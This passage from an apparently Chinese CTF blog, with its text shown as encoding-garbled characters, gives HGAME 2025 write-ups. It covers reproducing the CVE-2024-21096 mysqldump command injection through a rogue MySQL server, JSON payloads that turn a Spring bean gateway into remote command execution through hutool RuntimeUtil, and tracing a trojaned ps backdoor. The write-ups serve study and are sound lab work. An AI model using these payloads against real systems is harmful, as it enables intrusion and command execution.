æ¼æ´ï¼Œçœ‹ WP åé—®é¢˜ç¡®å®åœ¨ mysqldump ä¸Š</p><p>å‚è€ƒ WP å’Œåšå®¢ <a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a> è‡ªè¡Œç¼–è¯‘ä¸€ä¸ª mysql æœåŠ¡è¿›è¡Œå¤ç°ï¼š</p><p>å…ˆæ­å®‰è£…ç¼–è¯‘ä¾èµ–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config<br>wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz<br>tar -zxvf mysql-boost-8.0.34.tar.gz<br>cd mysql-8.0.34<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>mysql-8.0.34/include</code> ç›®å½•ä¸‹æ‰¾åˆ° <code>mysql_version.h.in</code> ç‰ˆæœ¬æ¨¡æ¿æ–‡ä»¶å¦‚ä¸‹ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/* Copyright Abandoned 1996,1999 TCX DataKonsult AB &amp; Monty Program KB</span><br><span class="hljs-comment">   &amp; Detron HB, 1996, 1999-2004, 2007 MySQL AB.</span><br><span class="hljs-comment">   This file is public domain and comes with NO WARRANTY of any kind</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* Version numbers for protocol &amp; mysqld */</span><br><br>#ifndef _mysql_version_h<br>#<span class="hljs-keyword">define</span> _mysql_version_h<br><br>#<span class="hljs-keyword">define</span> PROTOCOL_VERSION            <span class="hljs-variable">@PROTOCOL_VERSION</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_SERVER_VERSION       &quot;@VERSION@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_BASE_VERSION         &quot;mysqld-@MYSQL_BASE_VERSION@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_SERVER_SUFFIX_DEF    &quot;@MYSQL_SERVER_SUFFIX@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_VERSION_ID            <span class="hljs-variable">@MYSQL_VERSION_ID</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_PORT                  <span class="hljs-variable">@MYSQL_TCP_PORT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_ADMIN_PORT            <span class="hljs-variable">@MYSQL_ADMIN_TCP_PORT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_PORT_DEFAULT          <span class="hljs-variable">@MYSQL_TCP_PORT_DEFAULT</span>@<br>#<span class="hljs-keyword">define</span> MYSQL_UNIX_ADDR            &quot;@MYSQL_UNIX_ADDR@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_CONFIG_NAME          &quot;my&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_PERSIST_CONFIG_NAME  &quot;mysqld-auto&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_COMPILATION_COMMENT  &quot;@COMPILATION_COMMENT@&quot;<br>#<span class="hljs-keyword">define</span> MYSQL_COMPILATION_COMMENT_SERVER  &quot;@COMPILATION_COMMENT_SERVER@&quot;<br>#<span class="hljs-keyword">define</span> LIBMYSQL_VERSION           &quot;@VERSION@&quot;<br>#<span class="hljs-keyword">define</span> LIBMYSQL_VERSION_ID         <span class="hljs-variable">@MYSQL_VERSION_ID</span>@<br><br>#ifndef LICENSE<br>#<span class="hljs-keyword">define</span> LICENSE                     GPL<br>#endif <span class="hljs-comment">/* LICENSE */</span><br><br>#endif <span class="hljs-comment">/* _mysql_version_h */</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹è¯¥å¤„å³å¯ <code>#define MYSQL_SERVER_VERSION       &quot;@VERSION@&quot;</code></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AnMzbnkRcoHVpGxrVsIcVXzKnoh.png"></p><p>ç¼–è¯‘ï¼ˆå¾ˆä¹…ï¼Œæ‰€ä»¥ä¸Šä¸€æ­¥ä¿®æ”¹éœ€è°¨æ…ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build     //åœ¨åˆšæ‰çš„mysqlç›®å½•ä¸‹<br>cd build<br>cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost<br>make -j$(nproc)<br></code></pre></td></tr></table></figure><p>å®‰è£… MySQL <code>sudo make install</code></p><p>åˆ›å»ºâ½¤â¼¾ç»„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo groupadd mysql <br>sudo useradd -r -g mysql -s /bin/false mysql<br></code></pre></td></tr></table></figure><p>æ•°æ®åº“åˆå§‹åŒ–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data<br></code></pre></td></tr></table></figure><p>å¹¶è·å¾—åˆå§‹è´¦å·å¯†ç </p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/SANWbY4RsoYGGJxvcKUcafWtnrd.png"></p><p>è®¾ç½®â½¬å½•æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown -R mysql:mysql /usr/local/mysql <br>sudo chown -R mysql:mysql /usr/local/mysql/data<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ã€ä½¿â½¤è®°å½•çš„ root å¯†ç ç™»å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &amp;<br>/usr/local/mysql/bin/mysql -u root -p<br></code></pre></td></tr></table></figure><p>é‡ç½®å¯†ç å¹¶åˆ›å»º test åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;password&#x27;</span>; <br>FLUSH PRIVILEGES; <br><span class="hljs-keyword">CREATE</span> DATABASE test;<br></code></pre></td></tr></table></figure><p>é…ç½®è¿œç¨‹è¿æ¥ç™»å½•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">use mysql;<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;    ##æ”¹ä¸º<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-string">&#x27;%&#x27;</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>å…è®¸ä»»ä½•ipè®¿é—®<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;    ## æŸ¥çœ‹ç”¨æˆ·è®¿é—®ç«¯å£å¦‚ä¸‹<br>FLUSH PRIVILEGES;    ## åˆ·æ–°æœåŠ¡é…ç½®é¡¹<br>EXIT;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/X79hbhJtZoMoFcxJia4cGV1Tngg.png"></p><p>æŸ¥çœ‹ mysqldump ç‰ˆæœ¬æµ‹è¯• <code>/usr/local/mysql/bin/mysql --version</code>ï¼Œå¯ä»¥çœ‹åˆ°æ’å…¥çš„å‘½ä»¤</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/O07ab350LoC8euxB8VycO1hLnhf.png"></p><p>è™šæ‹Ÿæœºé…ç½®æ¡¥æ¥æ¨¡å¼ï¼Œä¸æœåŠ¡å™¨é€šè¿‡ ssh åå‘éš§é“æ„å»ºç«¯å£æ˜ å°„</p><p>è™šæ‹Ÿæœºä¸Šè¾“å…¥</p><p><code>sudo ssh -fN -R ï¼ˆæœåŠ¡å™¨ç«¯å£ï¼‰3306:localhost:3306ï¼ˆè™šæ‹Ÿæœºç«¯å£ï¼‰ æœåŠ¡å™¨ç™»å½•è´¦æˆ·å@æœåŠ¡å™¨å…¬ç½‘ip</code></p><p>è™šæ‹Ÿæœºä¸Šå¯ä½¿ç”¨ <code>ps aux | grep &quot;ssh -NfR&quot;</code> æŸ¥çœ‹è¿æ¥æƒ…å†µ</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/KwjpbrjtmoAe6UxLaYHc0BwJnBh.png"></p><p>æœåŠ¡å™¨ä¸Šè¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/ssh/sshd_config   #ä¿®æ”¹é…ç½®åŠ ä¸ŠGatewayPorts yesè¯­å¥å…è®¸åå‘éš§é“<br>sudo systemctl restart sshd   #é‡å¯ SSH æœåŠ¡<br>ps aux | grep ssh    #æŸ¥çœ‹SSHéš§é“çŠ¶æ€<br></code></pre></td></tr></table></figure><p>ç”¨ä¸»æœºå°è¯•é€šè¿‡æœåŠ¡å™¨ ip ç™»å½• mysqlï¼Œç™»å½•æˆåŠŸ</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FiYabpnbZoZL0FxZ8kucxrdsnsb.png"></p><p>å¯¼å…¥é¶æœºæ•°æ®åº“</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AwSJbc2CyogwkVxaKllconORnjd.png"></p><p>è®¿é—® <code>/flag</code>ï¼Œå‘ç°æˆåŠŸ RCEï¼Œè·å¾— flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JZ5Ib5RCwo2F7VxYyOGcM0gsnlb.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge">https://fanllspd.com/posts/cf41815c/#Level-21096-HoneyPot-Revenge</a></p><p><a href="https://tech.ec3o.fun/2024/10/25/Web-Vulnerability">https://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/</a></p><p><a href="https://blog.csdn.net/INSBUG/article/details/142262709">https://blog.csdn.net/INSBUG/article/details/142262709</a></p><h3 id="Level-60-SignInJava"><a href="#Level-60-SignInJava" class="headerlink" title="Level 60 SignInJava"></a>Level 60 SignInJava</h3><p>èµ›æ—¶æ²¡åšï¼Œç°åœ¨å†çœ‹çœ‹é¢˜ç›®ã€‚ä¸‹è½½é™„ä»¶ï¼Œé‡Œé¢ä¸€ä¸ª SigninJava.jarï¼Œåœ¨ idea é‡Œ Add as Library æ·»åŠ ä¸ºåº“å³å¯æŸ¥çœ‹æºç ï¼ˆjar æ–‡ä»¶å½“åšå‹ç¼©åŒ…å³å¯ï¼‰ï¼Œæ‰“å¼€åæ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼Œåº”è¯¥æ˜¯ç”¨äº† spring æ¡†æ¶ MVC æ¨¡å¼</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/DaIabKNmZoAX7sx9WGwcb1e0nVg.png"></p><p>å…¶ä¸­ BaseResponse è§„å®šäº†è¿”å›å†…å®¹çš„æ ¼å¼ï¼ŒAPIGatewayController ä½œä¸ºæ§åˆ¶å±‚è§„å®šäº†è·¯ç”±æ¥å£å’Œæ¥å—è¯·æ±‚åæ§åˆ¶ã€è°ƒç”¨çš„è§„åˆ™ï¼ŒHelloService å’Œ FlagTestService å¤„ç†é€»è¾‘ä¸šåŠ¡ï¼Œåˆ†åˆ«è¿”å›â€œhello xxxâ€å’Œè¯»å–&#x2F;flagï¼ŒInvokeUtils å’Œ SpringContextHolder ä½œä¸ºå·¥å…·æˆ–æ’ä»¶ï¼Œå‰è€…å¯ä»¥è°ƒç”¨æŒ‡å®š bean å’Œå…¶æŒ‡å®šæ–¹æ³•å¹¶ä¼ å…¥å‚æ•°ï¼Œåè€…å¯ä»¥æ–¹ä¾¿åœ°å¼•ç”¨å„ç§ bean è€Œä¸éœ€è¦æ³¨å…¥ã€‚</p><p>é‡ç‚¹çœ‹ APIGatewayController ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> icu.Liki4.signin.controller;<br><br><span class="hljs-keyword">import</span> cn.hutool.core.util.StrUtil;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSON;<br><span class="hljs-keyword">import</span> icu.Liki4.signin.base.BaseResponse;<br><span class="hljs-keyword">import</span> icu.Liki4.signin.util.InvokeUtils;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">APIGatewayController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">APIGatewayController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/gateway&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> BaseResponse <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> IOUtils.toString(request.getReader());<br>            Map&lt;String, Object&gt; map = (Map)JSON.parseObject(body, Map.class);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;beanName&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> (String)map.get(<span class="hljs-string">&quot;methodName&quot;</span>);<br>            Map&lt;String, Object&gt; params = (Map)map.get(<span class="hljs-string">&quot;params&quot;</span>);<br>            <span class="hljs-keyword">if</span> (StrUtil.containsAnyIgnoreCase(beanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharSequence</span>[]&#123;<span class="hljs-string">&quot;flag&quot;</span>&#125;)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;flagTestService offline&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> InvokeUtils.invokeBeanMethod(beanName, methodName, params);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">200</span>, (String)<span class="hljs-literal">null</span>, result);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>            <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var8;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BaseResponse</span>(<span class="hljs-number">500</span>, ((Throwable)Objects._requireNonNullElse_(e.getCause(), e)).getMessage(), (Object)<span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åªå¼€æ”¾äº† <code>/api/gateway</code>ï¼Œå¯ä»¥é€šè¿‡ post æ–¹æ³• json æ ¼å¼ä¼ é€’ <code>beanName</code>ã€<code>methodName</code>ã€<code>params</code>ï¼ˆMap ç±»å‹ï¼‰ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ <code>StrUtil.containsAnyIgnoreCase</code> å¯¹ <code>beanName</code> å­—ç¬¦ä¸²æ£€æµ‹æ˜¯å¦å«æœ‰ flagï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼Œå‡è¿‡æ»¤ï¼‰ï¼Œè‹¥æœ‰åˆ™è¿”å› <code>&quot;flagTestService offline&quot;</code>ï¼Œè‹¥æ— åˆ™è°ƒç”¨å¯¹åº”çš„ bean ä¸­çš„æ–¹æ³•ï¼Œè¿”å›ç»“æœã€‚</p><p>ä¸ºäº†å°è¯•è°ƒç”¨ bean å…ˆå»äº†è§£äº†ä¸€ä¸‹ Spring æ³¨è§£è‡ªåŠ¨ç”Ÿæˆçš„ Bean çš„ name å±æ€§å‘½åè§„åˆ™ï¼Œåœ¨ç±»ä¸ŠåŠ  <code>@``Component</code>ã€<code>@Repository</code>ã€<code>@Service</code>ã€<code>@Controller</code> æ³¨è§£æ¥å®šä¹‰ bean æ—¶ spring ä¼šè‡ªåŠ¨ç”Ÿæˆ beanï¼Œå¦‚æœä¸ä¸»åŠ¨å®šä¹‰ bean çš„ name é‚£ä¹ˆé»˜è®¤ä»¥ç±»åç§°çš„é¦–å­—æ¯å°å†™ä½œä¸º bean çš„ name å±æ€§ã€‚ä¾‹å¦‚ HelloService ç±»çš„ bean å°±æ˜¯ helloServiceã€‚</p><p>å°è¯•ï¼Œå¾—åˆ°é¢„æœŸè¿”å›</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JFunbdQNBofvZJxJnIvcy1Qqnyg.png"></p><p>å°è¯•è°ƒç”¨ flagTestService æœªèƒ½æ‰¾åˆ°è¿‡æ»¤ç»•è¿‡æ–¹æ³•</p><p>äºæ˜¯å°è¯•åˆ©ç”¨ SpringContextHolderï¼Œä½†åªèƒ½è·å–å®ä¾‹ï¼Œæ— æ³•è°ƒç”¨æ–¹æ³•è·å– flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/GOcibFNKUoAWUsxkJxAcNwgTnkd.png"></p><p>åé¢æ‰¾ä¸åˆ°å¯è¡Œçš„æ€è·¯äº†ï¼Œå¼€å§‹å€Ÿé‰´ç½‘ä¸Šçš„åšå®¢å’Œ WPï¼Œéœ€è¦å¯»æ‰¾å…¶ä»– bean å¯åˆ©ç”¨çš„ç±»ï¼Œç„¶è€Œæˆ‘ä¸çŸ¥é“ä»–ä»¬æ˜¯å¦‚ä½•ç­›é€‰å‡ºç›®æ ‡æ¥çš„ï¼ŒåªçŸ¥é“æœ€ç»ˆæ‰¾åˆ°çš„æ˜¯ hutool çš„ RuntimeUtil å…·æœ‰å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ï¼Œç„¶è€Œè¯¥ç±»å¹¶æ²¡æœ‰è¢«æ³¨å†Œï¼Œæ‰€ä»¥å‘½ä»¤æ‰§è¡Œå‰éœ€è¦å…ˆç”¨ hutool é‡Œçš„æ³¨å†Œ bean çš„æ–¹æ³•ã€‚ï¼ˆæˆ–è®¸è¿˜ä¸ååºåˆ—åŒ–æœ‰å…³ï¼Ÿæ­¤å¤„å¹¶æœªææ‡‚ï¼‰</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/AANIbGG8nonCiCxqc8ncKEC1n1f.png"></p><p>é€šè¿‡ hutool çš„ SpringUtil æ³¨å†Œ hutool çš„ RuntimeUtil</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span>,<br>    <span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;registerBean&quot;</span>,<br>    <span class="hljs-string">&quot;params&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;execCmd&quot;</span>,<br>        <span class="hljs-string">&quot;arg1&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Ez63bk1KioiOqOxZ7ajcgtAvnEd.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/HUxQb0lwOo0cQjx06Kpca5WanZb.png"></p><p>è°ƒç”¨ RuntimeUtil çš„ execForStr å®ç° RCE è·å¾— flag</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;execCmd&quot;</span>,<br>    <span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;execForStr&quot;</span>,<br>    <span class="hljs-string">&quot;params&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;utf-8&quot;</span>,<br>        <span class="hljs-string">&quot;arg1&quot;</span>:[<span class="hljs-string">&quot;/readflag&quot;</span>]<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/PcAvbbEvXoBox9xRYWmcRUlHnSK.png"></p><p>å‚è€ƒï¼š<a href="https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava">https://www.n0o0b.com/archives/hgame2025-week2#level-60-signinjava</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Computer-cleaner-plus"><a href="#Computer-cleaner-plus" class="headerlink" title="Computer cleaner plus"></a>Computer cleaner plus</h3><p>å°è¯•è¿‡æ£€ç´¢æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶ã€å…³é”®ç›®å½•çš„æŸ¥æ‰¾ã€æŒ‰å…³é”®å­—æ£€ç´¢ã€alias åˆ«åã€æŸ¥çœ‹è¿›ç¨‹ã€å¯åŠ¨é¡¹ã€å†å²å‘½ä»¤ç­‰ç­‰ï¼Œä½†æœªæ‰¾åˆ°æ¶æ„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>å®˜æ–¹ WP ç»™å‡ºçš„æ˜¯ <code>rpm -Vf /usr/bin/*</code>ï¼Œè¯¥æŒ‡ä»¤å¯ä»¥ç”¨ rpm éªŒè¯ <code>/usr/bin/</code> ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶æ‰€å±çš„ RPM è½¯ä»¶åŒ…æ˜¯å¦è¢«ä¿®æ”¹ï¼Œæˆ‘å»æ‰§è¡Œåå¯ä»¥å‘ç° ps ç›¸å…³å†…å®¹ç»è¿‡ä¿®æ”¹</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Ua8AbUFeso2cndxKo0fcaHJMnHb.png"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">å„å­—æ¯å«ä¹‰å¦‚ä¸‹ï¼š<br>S         æ–‡ä»¶å¤§å°æ˜¯å¦æ”¹å˜<br>M         æ–‡ä»¶çš„ç±»å‹æˆ–æ–‡ä»¶çš„æƒé™ï¼ˆrwxï¼‰æ˜¯å¦è¢«æ”¹å˜<br><span class="hljs-number">5</span>         æ–‡ä»¶<span class="hljs-symbol">MD5</span>æ ¡éªŒæ˜¯å¦æ”¹å˜ï¼ˆå¯ä»¥çœ‹æˆæ–‡ä»¶å†…å®¹æ˜¯å¦æ”¹å˜ï¼‰<br>D         è®¾å¤‡ä¸­ï¼Œä»ä»£ç æ˜¯å¦æ”¹å˜<br>L         æ–‡ä»¶è·¯å¾„æ˜¯å¦æ”¹å˜<br>U         æ–‡ä»¶çš„å±ä¸»ï¼ˆæ‰€æœ‰è€…ï¼‰æ˜¯å¦æ”¹å˜<br>G         æ–‡ä»¶çš„å±ç»„æ˜¯å¦æ”¹å˜<br><span class="hljs-built_in">T</span>         æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦æ”¹å˜<br></code></pre></td></tr></table></figure><p>è¯´æ˜ ps æ–‡ä»¶çš„å¤§å°ã€æƒé™ã€å†…å®¹ã€ä¿®æ”¹æ—¶é—´å‡å‘ç”Ÿå˜åŒ–ï¼Œä¸‹é¢è¿˜æœ‰å¤šå¤„</p><p>æ‰€ä»¥æŸ¥çœ‹ ps æ–‡ä»¶ï¼Œå‘ç°å¯ç–‘ elf æ–‡ä»¶å³ä¸º flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/QJxWbFdjSoHCjFxDST7c0zJVnKb.png"></p><p>è¿™é‡Œä¿®æ”¹åçš„å‘½ä»¤è¿è¡Œäº†åé—¨ç¨‹åº <code>B4ck_D0_oR.elf</code>ï¼Œç„¶åè°ƒç”¨ <code>/.hide_command</code> ä¸‹çš„ ps å‘½ä»¤ï¼Œå†è¿‡æ»¤äº†åŒ…å« <code>shell</code> å’Œ <code>B4ck_D0_oR</code> çš„ç›¸å…³å†…å®¹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–å°ç»“</title>
